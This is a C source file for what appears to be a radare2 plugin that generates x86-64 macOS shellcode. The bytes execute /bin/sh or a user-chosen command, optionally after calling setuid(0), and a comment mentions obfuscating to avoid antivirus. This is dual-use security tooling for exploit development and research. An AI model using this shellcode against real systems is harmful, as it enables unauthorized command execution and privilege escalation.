/* radare - LGPL - Copyright 2011 pancake<@nopcode.org> */
#include <r_egg.h>

// XXX: must obfuscate to avoid antivirus
static ut8 x86_osx_suid_binsh[] =
        "\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17" 
	/* suid */ "\x31\xff\x4c\x89\xc0\x0f\x05"
	"\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52"
        "\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff"
	// CMD
	"\x2f\x62\x69\x6e\x2f\x73\x68";
static ut8 x86_osx_binsh[] =
        "\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17" 
	// SUIDSH "\x31\xff\x4c\x89\xc0\x0f\x05"
	"\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52"
        "\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff"
	// CMD
	"\x2f\x62\x69\x6e\x2f\x73\x68";

static RBuffer *build (REgg *egg) {
	RBuffer *buf = r_buf_new ();
	const ut8 *sc;
	char *shell = r_egg_option_get (egg, "cmd");
	char *suid = r_egg_option_get (egg, "suid");
	// TODO: last char must not be \x00 .. or what? :D
	if (suid && *suid=='f') { // false
		free (suid);
		suid = NULL;
	}
	sc = suid? x86_osx_suid_binsh: x86_osx_binsh;
	r_buf_set_bytes (buf, sc, strlen ((const char *)sc));
	if (shell && *shell) {
		int ptr = (suid)?7+36: 36;
		r_buf_write_at (buf, ptr, (const ut8*)shell, strlen (shell)+1);
	}
	free (suid);
	free (shell);
	return buf;
}

//TODO: rename plugin to run
REggPlugin r_egg_plugin_x86_osx_binsh = {
	.name = "x86.osx.binsh",
	.bits = 64,
	.desc = "execute cmd=/bin/sh suid=false",
	.bytes = x86_osx_binsh,
	.length = sizeof (x86_osx_binsh),
	.build = (void *)build
};

#ifndef CORELIB
struct r_lib_struct_t radare_plugin = {
	.type = R_LIB_TYPE_EGG,
	.data = &r_egg_plugin_x86_osx_binsh
};
#endif
